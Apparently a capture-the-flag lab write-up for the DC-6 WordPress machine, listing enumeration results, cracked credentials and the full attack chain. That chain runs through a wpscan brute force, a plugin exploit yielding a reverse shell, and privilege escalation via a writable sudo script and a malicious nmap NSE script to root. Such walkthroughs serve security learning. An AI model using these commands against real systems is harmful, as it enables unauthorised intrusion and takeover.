OS:  Debian 7.4p1  

Web Technology:   

IP:       192.168.1.116 

USERS: 
Jens
sarah
admin
graham
mark

CREDENTIALS:   
mark:helpdesk01
wpdbuser:meErKatZ
graham:GSo7isUM1D4


#####################################################

80 HTTP →  Fuzzing Files/Directories →  manual inspection → robots.txt, .DS_STORE, .svn → wpscan ()        

Steps Taken (DC_6):
[+]  nmap scan -p- -sC -sV -iL target --open
[+] Recieved ports 80 and 22
[+] wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 “$URL”
[+] wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 “$URL”
[+] wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u   
[+] wpscan --url $URL --disable-tls-checks -U users -P passwords
[+] wpscan bruteforce mark  -  helpdesk01 
[+] logged in to http://wordy/wp-admin
[+] Discovery of vulnerable pulgin: Activity Monitor
[+] searchsploit wordpress activity monitor
[+] python 50110.py 
[+] obtained a reverse shell
[+] Started NetCat listener on port 1 for a stable shell
[+] python -c “import pty;pty.spawn('/bin/bash')”
[+] export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
[+] export TERM=xterm-256color
[+] alias ll='clear ; ls -lsaht --color=auto'
[+] Checked wp-config.php file and found MySQL database credentials 
[+] Found “things-to-do.txt” with credentials for Graham in Marks directory
[+] Logging in as Graham successful
[+] backups.sh with permission to write given to Devs group found in Jens directory
[+] Graham in Devs group
[+] Append “/bin/bash” to backups.sh
[+] sudo -u jens /home/jens/backups.sh
[+] Successful shell as user Jens
[+] sudo -l 
[+] Jen access to nmap as root 
[+]User Jens creates an NSE script which will open a bash shell
[+] echo “os.system('/bin/bash')” >> /tmp/offsec.nse
[+]/tmp directory with write permission
[+] sudo nmap --script /tmp/offsec.nse
[+] root shell obtained

#####################################################
NMAP RESULTS:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Wordy &#8211; Just another WordPress site
|_http-generator: WordPress 5.1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


#####################################################
Web Services Enumeration:  

[  +  WFUZZ  ]

FILES:   /   (Web Root)
200  	"wp-login.php"                                     
200   "index.php"                                        
405 	"xmlrpc.php"                                       
200 	"wp-config.php"                                    
200   "wp-trackback.php"                                 
500   "wp-settings.php"                                  
200   	"wp-cron.php"                                      
200   	"wp-blog-header.php"                               
200   "wp-links-opml.php"                                
200   "wp-load.php"                                      
302   "wp-signup.php"                                    
302   "wp-activate.php"  

DIRECTORIES:  /  (Web Root)
200   "wp-content"                                       
200   "wp-includes"                                      
302   "wp-admin"                                         

#####################################################
OTHER:  

Activity Monitor

#####################################################
Take Away Concepts
[+] Wordpress 5.1.1    →   utilize wpscan as this is the correct tool for the job    
[+] If we can obtain a legitimate SESSION_ID for any web application and there exists an authenticated exploit, then it should work fine. It doesn't always have to be an admin user
[+] if we have a real user on the machine → sudo -l to see if there is any extended permissability
